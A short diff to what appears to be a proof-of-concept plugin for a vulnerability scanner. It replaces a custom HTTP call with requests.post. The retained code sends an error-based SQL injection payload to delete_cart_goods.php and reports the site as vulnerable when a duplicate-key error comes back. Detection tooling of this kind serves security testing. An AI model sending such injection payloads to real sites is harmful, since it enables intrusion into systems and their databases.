@@ -35,9 +35,9 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             url = arg + "/delete_cart_goods.php"
             payload = "id=1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)"
-            code, head, res, errcode,finalurl = hh.http(url + " -d '" + payload +"'")
-                       
-            if code == 200:
+            req = requests.post(url, data=payload)
+            res = req.text
+            if req.status_code == 200:
                 if res.find("for key 'group_key'") != -1:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
